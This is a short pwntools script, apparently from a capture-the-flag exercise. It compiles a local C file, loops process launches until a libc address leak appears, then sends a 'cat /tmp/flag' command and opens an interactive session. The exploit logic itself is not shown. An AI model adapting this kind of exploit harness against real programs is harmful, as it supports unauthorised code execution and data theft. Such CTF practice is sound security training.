from pwn import*
context.log_level = 'DEBUG'
os.system("gcc 2.c -o main -z noexecstack -fstack-protector-all -pie -z now")
while True:
	l = process("./echo_srv")
	p = process('./main')
	try:
		p.recvuntil("LIBC:\t",timeout=0.5)
		break
	except:
		l.close()
		p.close()
		continue
os.system("rm core")
p.sendline('cat /tmp/flag')
p.interactive()
